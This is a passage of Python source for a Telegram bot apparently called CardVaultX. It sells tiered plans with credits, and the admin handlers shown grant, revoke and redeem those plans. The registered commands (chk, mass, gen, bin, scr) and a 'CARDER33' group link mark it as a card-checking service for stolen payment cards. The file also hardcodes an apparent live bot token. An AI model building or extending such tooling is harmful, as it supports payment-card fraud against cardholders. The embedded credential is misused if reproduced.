        "╭━━━『 𝐀𝐮𝐭𝐡𝐨𝐫𝐢𝐳𝐞𝐝 𝐆𝐫𝐨𝐮𝐩𝐬 』━━━╮\n"
        f"{authorized_groups_str}\n"
        "╭━━━『 𝐀𝐮𝐭𝐡𝐨𝐫𝐢𝐳𝐞𝐝 𝐔𝐬𝐞𝐫𝐬 \\(Private Plans\\) 』━━━╮\n"
        f"{authorized_users_str}"
    )

    await update.effective_message.reply_text(
        admin_dashboard_message,
        parse_mode=ParseMode.MARKDOWN_V2
    )



async def _update_user_plan(user_id: int, plan_name: str, credits: int, duration_days: int = None):
    """Updates user's subscription plan and expiry."""
    plan_expiry = 'N/A'
    if duration_days:
        expiry_date = datetime.now() + timedelta(days=duration_days)
        plan_expiry = expiry_date.strftime('%d-%m-%Y')

    await update_user(
        user_id,
        plan=plan_name,
        status=plan_name,
        credits=credits,
        plan_expiry=plan_expiry
    )

    AUTHORIZED_PRIVATE_USERS.add(user_id)

    # Re-fetch updated user data if needed
    user_data = await get_user(user_id)
    return user_data


from datetime import datetime, timedelta
from telegram.constants import ParseMode

PLAN_DEFINITIONS = {
    "starter": {"name": "Starter Plan", "credits": 300, "days": 7},
    "premium": {"name": "Premium Plan", "credits": 1000, "days": 30},
    "plus": {"name": "Plus Plan", "credits": 2000, "days": 60},
    "custom": {"name": "Custom Plan", "credits": 3000, "days": None},
}

def escape_markdown_v2(text: str) -> str:
    return re.sub(r'([_*\[\]()~`>#+\-=|{}.!\\])', r'\\\1', str(text))


from datetime import datetime

async def give_starter(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        return await update.effective_message.reply_text("🚫 You are not authorized to use this command.")

    if not context.args or not context.args[0].isdigit():
        return await update.effective_message.reply_text(
            "❌ Invalid format\\. Usage: `/give_starter [user_id]`",
            parse_mode=ParseMode.MARKDOWN_V2
        )

    user_id = int(context.args[0])
    await _update_user_plan(user_id, 'Starter Plan', 300, 7)
    await update.effective_message.reply_text(
        f"✅ Starter Plan activated for user `{user_id}`\\.",
        parse_mode=ParseMode.MARKDOWN_V2
    )

    # Fetch user info and send congratulation
    try:
        chat = await context.bot.get_chat(user_id)
        first_name = chat.first_name or "Warrior"
    except Exception:
        first_name = "Warrior"

    date_str = datetime.now().strftime('%d %B %Y')
    congrats_text = generate_congrats_box(user_id, "Starter", "KILLER + TOOLS", date_str, first_name)

    try:
        await context.bot.send_message(
            chat_id=user_id,
            text=congrats_text,
            parse_mode=ParseMode.MARKDOWN_V2
        )
    except Exception as e:
        await update.effective_message.reply_text(f"⚠️ Failed to send congratulatory message to user `{user_id}`\\.\nError: `{e}`", parse_mode=ParseMode.MARKDOWN_V2)

from datetime import datetime

async def give_premium(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        return await update.effective_message.reply_text("🚫 You are not authorized to use this command.")

    if not context.args or not context.args[0].isdigit():
        return await update.effective_message.reply_text(
            "❌ Invalid format\\. Usage: `/give_premium [user_id]`",
            parse_mode=ParseMode.MARKDOWN_V2
        )

    user_id = int(context.args[0])
    await _update_user_plan(user_id, 'Premium Plan', 1000, 30)
    await update.effective_message.reply_text(
        f"✅ Premium Plan activated for user `{user_id}`\\.",
        parse_mode=ParseMode.MARKDOWN_V2
    )

    # Fetch user details
    try:
        chat = await context.bot.get_chat(user_id)
        first_name = chat.first_name or "Warrior"
    except Exception:
        first_name = "Warrior"

    date_str = datetime.now().strftime('%d %B %Y')
    congrats_text = generate_congrats_box(user_id, "Premium", "KILLER + TOOLS", date_str, first_name)

    try:
        await context.bot.send_message(
            chat_id=user_id,
            text=congrats_text,
            parse_mode=ParseMode.MARKDOWN_V2
        )
    except Exception as e:
        await update.effective_message.reply_text(
            f"⚠️ Failed to send congratulatory message to user `{user_id}`\\.\nError: `{e}`",
            parse_mode=ParseMode.MARKDOWN_V2
        )


from datetime import datetime

async def give_plus(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        return await update.effective_message.reply_text("🚫 You are not authorized to use this command.")

    if not context.args or not context.args[0].isdigit():
        return await update.effective_message.reply_text(
            "❌ Invalid format\\. Usage: `/give_plus [user_id]`",
            parse_mode=ParseMode.MARKDOWN_V2
        )

    user_id = int(context.args[0])
    await _update_user_plan(user_id, 'Plus Plan', 2000, 60)

    await update.effective_message.reply_text(
        f"✅ Plus Plan activated for user `{user_id}`\\.",
        parse_mode=ParseMode.MARKDOWN_V2
    )

    # Fetch user's name
    try:
        chat = await context.bot.get_chat(user_id)
        first_name = chat.first_name or "Warrior"
    except Exception:
        first_name = "Warrior"

    # Create and send congratulations box
    date_str = datetime.now().strftime('%d %B %Y')
    congrats_text = generate_congrats_box(user_id, "Plus", "KILLER + TOOLS", date_str, first_name)

    try:
        await context.bot.send_message(
            chat_id=user_id,
            text=congrats_text,
            parse_mode=ParseMode.MARKDOWN_V2
        )
    except Exception as e:
        await update.effective_message.reply_text(
            f"⚠️ Failed to send congratulatory message to user `{user_id}`\\.\nError: `{e}`",
            parse_mode=ParseMode.MARKDOWN_V2
        )

from datetime import datetime

async def give_custom(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        return await update.effective_message.reply_text("🚫 You are not authorized to use this command.")

    if not context.args or not context.args[0].isdigit():
        return await update.effective_message.reply_text(
            "❌ Invalid format\\. Usage: `/give_custom [user_id]`",
            parse_mode=ParseMode.MARKDOWN_V2
        )

    user_id = int(context.args[0])
    await _update_user_plan(user_id, 'Custom Plan', 3000)

    await update.effective_message.reply_text(
        f"✅ Custom Plan activated for user `{user_id}` with 3000 credits\\.",
        parse_mode=ParseMode.MARKDOWN_V2
    )

    # Get first name for congrats message
    try:
        chat = await context.bot.get_chat(user_id)
        first_name = chat.first_name or "Warrior"
    except Exception:
        first_name = "Warrior"

    # Generate & send congratulatory message
    date_str = datetime.now().strftime('%d %B %Y')
    congrats_text = generate_congrats_box(
        user_id=user_id,
        plan="Custom",
        access_level="KILLER + TOOLS",
        date=date_str,
        first_name=first_name
    )

    try:
        await context.bot.send_message(
            chat_id=user_id,
            text=congrats_text,
            parse_mode=ParseMode.MARKDOWN_V2
        )
    except Exception as e:
        await update.effective_message.reply_text(
            f"⚠️ Failed to send congratulatory message to user `{user_id}`\\.\nError: `{e}`",
            parse_mode=ParseMode.MARKDOWN_V2
        )


async def take_plan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Removes a user's current plan and revokes private access."""
    if update.effective_user.id not in ADMIN_IDS:
        return await update.effective_message.reply_text("🚫 You are not authorized to use this command.")

    if not context.args or not context.args[0].isdigit():
        return await update.effective_message.reply_text("❌ Invalid format\\. Usage: `/take_plan [user_id]`", parse_mode=ParseMode.MARKDOWN_V2)
    
    try:
        user_id = int(context.args[0])
        user_data = await get_user(user_id)  # ✅ FIXED: was `user.id` before (wrong variable)
        
        # Reset plan and credits
        user_data['plan'] = 'Free'
        user_data['status'] = 'Free'
        user_data['plan_expiry'] = 'N/A'
        user_data['credits'] = DEFAULT_FREE_CREDITS
        
        # Persist the update
        await update_user(
            user_id,
            plan='Free',
            status='Free',
            plan_expiry='N/A',
            credits=DEFAULT_FREE_CREDITS
        )

        # Remove from private authorized users
        AUTHORIZED_PRIVATE_USERS.discard(user_id)

        await update.effective_message.reply_text(
            f"✅ Plan and private access have been removed for user `{user_id}`\\.",
            parse_mode=ParseMode.MARKDOWN_V2
        )

    except ValueError:
        return await update.effective_message.reply_text(
            "❌ Invalid user ID format\\. Please provide a valid integer user ID\\.",
            parse_mode=ParseMode.MARKDOWN_V2
        )


def generate_congrats_box(user_id: int, plan: str, access_level: str, date: str, first_name: str) -> str:
    from telegram.helpers import escape_markdown
    return (
        f"╭━━━[ 🎉 𝐂𝐨𝐧𝐠𝐫𝐚𝐭𝐬, {escape_markdown(first_name, version=2)}\\! ]━━━╮\n"
        f"┃\n"
        f"┃ ✨ *Access to* ⚡ `𝓒𝓪𝓻𝓭𝓥𝓪𝓾𝓵𝓽𝑿` *has been granted\\.*\n"
        f"┃\n"
        f"┃ 🆔 *𝙄𝘿*             : `{user_id}`\n"
        f"┃ 💎 *𝙋𝙡𝙖𝙣*           : `{plan}`\n"
        f"┃ 🧰 *𝘼𝙘𝙘𝙚𝙨𝙨 𝙇𝙚𝙫𝙚𝙡*   : `{access_level}`\n"
        f"┃ 📅 *𝘿𝙖𝙩𝙚*           : `{date}`\n"
        f"┃ 🔓 *𝙎𝙩𝙖𝙩𝙪𝙨*         : `✔ Activated`\n"
        f"┃\n"
        f"╰━━━━━━━━━━━━━━━━━━━━━━━╯\n"
        f"\n"
        f"💠 *𝕎𝕖𝕝𝕔𝕠𝕞𝕖 𝕥𝕠 𝓒𝓪𝓻𝓭𝓥𝓪𝓾𝓵𝓽𝓧* — 𝙉𝙤 𝙡𝙞𝙢𝙞𝙩𝙨 𝙅𝙪𝙨𝙩 𝙥𝙤𝙬𝙚𝙧\\.\n"
        f"𝙔𝙤𝙪’𝙧𝙚 𝙣𝙤𝙬 𝙖 𝙥𝙧𝙤𝙪𝙙 𝙢𝙚𝙢𝙗𝙚𝙧 𝙤𝙛 𝙩𝙝𝙚 *𝗘𝗹𝗶𝘁𝗲 {escape_markdown(plan, version=2)} 𝗧𝗶𝗲𝗿*\\.\n"
        f"\n"
        f"🍷 *𝓣𝓱𝓪𝓷𝓴𝓼 𝓯𝓸𝓻 𝓬𝓱𝓸𝓸𝓼𝓲𝓷𝓰 𝓒𝓪𝓻𝓭𝓥𝓪𝓾𝓵𝓽𝓧\\!* 𝙔𝙤𝙪𝙧 𝙖𝙘𝙘𝙚𝙨𝙨 𝙞𝙨 𝙣𝙤𝙬 𝙤𝙥𝙚𝙣\\."
    )


async def auth_group(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Authorizes a group to use the bot."""
    if update.effective_user.id not in ADMIN_IDS:
        return await update.effective_message.reply_text("🚫 You are not authorized to use this command.")

    if not context.args or not context.args[0].strip('-').isdigit():
        return await update.effective_message.reply_text(
            "❌ Invalid format\\. Usage: `/au [chat_id]`", 
            parse_mode=ParseMode.MARKDOWN_V2
        )
    
    try:
        chat_id = int(context.args[0])
        if chat_id > 0:
            return await update.effective_message.reply_text(
                "❌ That is not a group chat ID\\. Make sure you provide a valid group chat ID that starts with `-`\\.", 
                parse_mode=ParseMode.MARKDOWN_V2
            )

        AUTHORIZED_CHATS.add(chat_id)
        await update.effective_message.reply_text(
            f"✅ Group with chat ID `{chat_id}` has been authorized\\.", 
            parse_mode=ParseMode.MARKDOWN_V2
        )

    except ValueError:
        return await update.effective_message.reply_text(
            "❌ Invalid chat ID format\\. Please provide a valid integer chat ID\\.", 
            parse_mode=ParseMode.MARKDOWN_V2
        )


import os
import asyncpg
from telegram import Update
from telegram.ext import ContextTypes

ADMIN_USER_ID = 8406230162  # Replace with your admin user ID

async def reset_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await update.message.reply_text("❌ You are not authorized to use this command.")
        return

    if not context.args or not context.args[0].isdigit():
        await update.message.reply_text("⚠️ Usage: /reset <amount_of_credits>\nExample: /reset 500")
        return

    new_credits = int(context.args[0])
    database_url = os.getenv("DATABASE_URL")
    if not database_url:
        await update.message.reply_text("❌ DATABASE_URL environment variable not set.")
        return

    try:
        conn = await asyncpg.connect(dsn=database_url)
        await conn.execute("UPDATE users SET credits = $1", new_credits)
        await conn.close()
    except Exception as e:
        await update.message.reply_text(f"❌ Database error: {e}")
        return

    await update.message.reply_text(f"✅ All user credits have been reset to {new_credits}.")


async def remove_authorize_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Removes a user's private access and resets their plan."""
    if not context.args or not context.args[0].isdigit():
        return await update.effective_message.reply_text(
            "❌ Invalid format\\. Usage: `/rauth [user_id]`",
            parse_mode=ParseMode.MARKDOWN_V2
        )

    try:
        user_id = int(context.args[0])

        if user_id in AUTHORIZED_PRIVATE_USERS:
            AUTHORIZED_PRIVATE_USERS.remove(user_id)

            # Update the user in the database
            await update_user(
                user_id,
                plan='Free',
                status='Free',
                credits=DEFAULT_FREE_CREDITS,
                plan_expiry='N/A'
            )

            await update.effective_message.reply_text(
                f"✅ User `{user_id}` has been de-authorized and plan reset to Free\\.",
                parse_mode=ParseMode.MARKDOWN_V2
            )
        else:
            await update.effective_message.reply_text(
                f"ℹ️ User `{user_id}` was not in the authorized private list\\.",
                parse_mode=ParseMode.MARKDOWN_V2
            )
    except ValueError:
        return await update.effective_message.reply_text(
            "❌ Invalid user ID format\\. Please provide a valid integer user ID\\.",
            parse_mode=ParseMode.MARKDOWN_V2
        )

import re
import uuid
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes

# Global redeem code storage (if not already defined)
REDEEM_CODES = {}

# Escape function for MarkdownV2
def escape_markdown_v2(text: str) -> str:
    return re.sub(r'([_*\[\]()~`>#+\-=|{}.!\\])', r'\\\1', text)

async def gen_codes_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Generates 10 redeem codes for the Starter Plan."""
    generated_codes = []
    for _ in range(10):
        code = str(uuid.uuid4()).replace('-', '')[:12].upper()
        REDEEM_CODES[code] = {
            'plan_name': 'Starter Plan',
            'credits': 300,
            'duration_days': 7
        }
        generated_codes.append(code)

    code_list_text = "\n".join([f"`{escape_markdown_v2(code)}`" for code in generated_codes])

    response_text = (
        "✅ *10 new redeem codes for the Starter Plan have been generated:* \n\n"
        f"{code_list_text}\n\n"
        "These codes are one\\-time use\\. Share them wisely\\."
    )

    await update.effective_message.reply_text(response_text, parse_mode=ParseMode.MARKDOWN_V2)

async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Redeems a code to activate a plan."""
    user = update.effective_user
    user_id = user.id

    if not context.args or len(context.args) != 1:
        return await update.effective_message.reply_text(
            "❌ Invalid format\\. Usage: `/redeem [code]`",
            parse_mode=ParseMode.MARKDOWN_V2
        )

    code = context.args[0].upper()
    plan_details = REDEEM_CODES.get(code)

    if not plan_details:
        return await update.effective_message.reply_text(
            "❌ Invalid or already used code\\.",
            parse_mode=ParseMode.MARKDOWN_V2
        )

    user_data = await get_user(user_id)
    if user_data.get('plan') != 'Free':
        return await update.effective_message.reply_text(
            "❌ You already have an active plan\\.",
            parse_mode=ParseMode.MARKDOWN_V2
        )

    # Apply the plan and remove the used code
    plan_name = plan_details['plan_name']
    credits = plan_details['credits']
    duration_days = plan_details['duration_days']
    await _update_user_plan(user_id, plan_name, credits, duration_days)
    del REDEEM_CODES[code]

    response_text = (
        f"🎉 Congratulations\\! Your `{escape_markdown_v2(plan_name)}` has been activated\\.\n"
        f"You have been granted `{credits}` credits and your plan will be active for `{duration_days}` days\\.\n"
        f"Your private access is now active\\."
    )

    await update.effective_message.reply_text(response_text, parse_mode=ParseMode.MARKDOWN_V2)


async def handle_unauthorized_commands(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handles commands that are not explicitly authorized for the user/chat."""
    # This handler is a fallback and can be used for logging or a generic message.
    pass

async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Log the error and send a user-friendly message if possible."""
    logger.error("Exception while handling an update:", exc_info=context.error)
    if update and update.effective_message:
        try:
            await update.effective_message.reply_text("❌ An unexpected error occurred\\. Please try again later or contact the owner\\.", parse_mode=ParseMode.MARKDOWN_V2)
        except Exception as e:
            logger.error(f"Failed to send error message to user: {e}")



# === REGISTERING COMMANDS AND HANDLERS ===
# === REGISTERING COMMANDS AND HANDLERS ===
import os
import logging
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    CallbackQueryHandler,
    ContextTypes,
    MessageHandler,
    filters
)
from db import init_db

# 🛡️ Security
AUTHORIZED_CHATS = set()  # Groups you manually authorize
OWNER_ID = 8406230162     # Replace with your Telegram user ID

# 🔑 Bot token
BOT_TOKEN = "8392489510:AAGujPltw1BvXv9KZtolvgsZOc_lfVbTYwU"

# ✅ Logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


# 🚫 Unauthorized firewall handler
async def block_unauthorized(update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🚫 This group is not authorized to use this bot.\n\n"
        "📩 Contact @K4linuxx to get access.\n"
        "🔗 Official group: https://t.me/CARDER33"
    )


# 🧠 Database init
async def post_init(application):
    await init_db()
    logger.info("Database initialized")


def main():
    application = ApplicationBuilder().token(BOT_TOKEN).post_init(post_init).build()

    # Group filter must align with other handlers (no extra space!)
    application.add_handler(MessageHandler(filters.COMMAND, group_filter), group=-1)

    # ✨ Public Commands
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("info", info))
    application.add_handler(CommandHandler("credits", credits_command))
    application.add_handler(CommandHandler("chk", chk_command))
    application.add_handler(CommandHandler("mchk", mchk_command))
    application.add_handler(CommandHandler("mass", mass_command))
    application.add_handler(CommandHandler("mtchk", mtchk))
    application.add_handler(CommandHandler("gen", gen))
    application.add_handler(CommandHandler("open", open_command))
    application.add_handler(CommandHandler("adcr", adcr_command))
    application.add_handler(CommandHandler("bin", bin_lookup))
    application.add_handler(CommandHandler("fk", fk_command))
    application.add_handler(CommandHandler("scr", scrap_command))
    application.add_handler(CommandHandler("fl", fl_command))
    application.add_handler(CommandHandler("status", status_command))
    application.add_handler(CommandHandler("redeem", redeem_command))

    # 🔐 Admin Commands
    owner_filter = filters.User(OWNER_ID)
    application.add_handler(CommandHandler("admin", admin_command, filters=owner_filter))
    application.add_handler(CommandHandler("give_starter", give_starter, filters=owner_filter))
    application.add_handler(CommandHandler("give_premium", give_premium, filters=owner_filter))
    application.add_handler(CommandHandler("give_plus", give_plus, filters=owner_filter))
    application.add_handler(CommandHandler("give_custom", give_custom, filters=owner_filter))
    application.add_handler(CommandHandler("take_plan", take_plan, filters=owner_filter))
    application.add_handler(CommandHandler("au", auth_group, filters=owner_filter))
    application.add_handler(CommandHandler("reset", reset_command))
    application.add_handler(CommandHandler("rauth", remove_authorize_user, filters=owner_filter))
    application.add_handler(CommandHandler("gen_codes", gen_codes_command, filters=owner_filter))

    # Callback & Error
    application.add_handler(CallbackQueryHandler(handle_callback))
    application.add_error_handler(error_handler)

    # 🔁 Start polling
    logger.info("Bot started and is polling for updates...")
    application.run_polling()


if __name__ == '__main__':
    main()
